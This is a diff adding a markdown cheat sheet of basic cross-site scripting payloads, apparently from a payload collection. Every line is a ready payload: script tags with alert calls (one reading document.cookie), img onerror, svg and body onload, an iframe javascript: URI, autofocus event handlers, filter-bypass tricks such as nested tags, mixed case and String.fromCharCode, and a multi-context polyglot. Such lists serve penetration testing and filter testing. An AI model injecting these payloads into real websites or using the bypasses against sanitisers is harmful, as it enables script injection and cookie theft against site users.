@@ -1,0 +1,41 @@
+# Basic XSS Payloads
+
+## Alert Box
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+## IMG Tag
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img/src="x"/onerror=alert(1)>
+
+## Body Onload
+<body onload=alert('XSS')>
+
+## SVG
+<svg onload=alert('XSS')>
+<svg/onload=alert(1)>
+
+## Input
+<input onfocus=alert('XSS') autofocus>
+
+## Iframe
+<iframe src="javascript:alert('XSS')">
+
+## Details/Summary
+<details open ontoggle=alert('XSS')>
+
+## Common Filter Bypasses
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+## Event Handlers
+<div onmouseover=alert('XSS')>Hover me</div>
+<marquee onstart=alert('XSS')>
+<select onfocus=alert('XSS') autofocus>
+
+## Polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
